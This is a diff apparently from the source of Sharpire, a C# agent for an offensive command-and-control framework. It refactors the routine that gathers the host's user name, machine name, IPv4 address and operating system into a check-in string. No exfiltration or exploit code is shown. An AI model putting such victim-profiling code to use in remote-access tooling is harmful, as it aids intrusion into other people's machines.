@@ -482,61 +482,57 @@ namespace Sharpire
             information += Environment.UserName + "|";
             information += Environment.MachineName + "|";
 
-            using (ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2"))
+            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
+            scope.Connect();
+            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
+            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
+            using (ManagementObjectCollection objectCollection = objectSearcher.Get())
             {
-                scope.Connect();
-                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
-                using (ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query))
+                string ipAddress = "";
+                foreach (ManagementObject managementObject in objectCollection)
                 {
-                    using (ManagementObjectCollection objectCollection = objectSearcher.Get())
+                    using (managementObject)
                     {
-                        string ipAddress = "";
-                        foreach (ManagementObject managementObject in objectCollection)
+                        string[] addresses = (string[])managementObject["IPAddress"];
+                        if (null != addresses)
                         {
-                            using (managementObject)
+                            foreach (string address in addresses)
                             {
-                                string[] addresses = (string[])managementObject["IPAddress"];
-                                if (null != addresses)
+                                if (address.Contains("."))
                                 {
-                                    foreach (string address in addresses)
-                                    {
-                                        if (address.Contains("."))
-                                        {
-                                            ipAddress = address;
-                                        }
-                                    }
+                                    ipAddress = address;
                                 }
                             }
-                        }
-
-                        if (0 < ipAddress.Length)
-                        {
-                            information += ipAddress + "|";
-                        }
-                        else
-                        {
-                            information += "0.0.0.0|";
                         }
                     }
                 }
 
-                query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
-                using (ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query))
+                if (0 < ipAddress.Length)
                 {
-                    using (ManagementObjectCollection objectCollection = objectSearcher.Get())
-                    {
-                        string operatingSystem = "";
-                        foreach (ManagementObject managementObject in objectCollection)
-                        {
-                            using (managementObject)
-                            {
-                                operatingSystem = (string)managementObject["Name"];
-                                operatingSystem = operatingSystem.Split('|')[0];
-                            }
-                        }
+                    information += ipAddress + "|";
+                }
+                else
+                {
+                    information += "0.0.0.0|";
+                }
+            }
 
-                        information += operatingSystem + "|";
+            query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
+            using (ManagementObjectSearcher objectSearcher2 = new ManagementObjectSearcher(scope, query))
+            {
+                using (ManagementObjectCollection objectCollection = objectSearcher2.Get())
+                {
+                    string operatingSystem = "";
+                    foreach (ManagementObject managementObject in objectCollection)
+                    {
+                        using (managementObject)
+                        {
+                            operatingSystem = (string)managementObject["Name"];
+                            operatingSystem = operatingSystem.Split('|')[0];
+                        }
                     }
+
+                    information += operatingSystem + "|";
                 }
             }
 
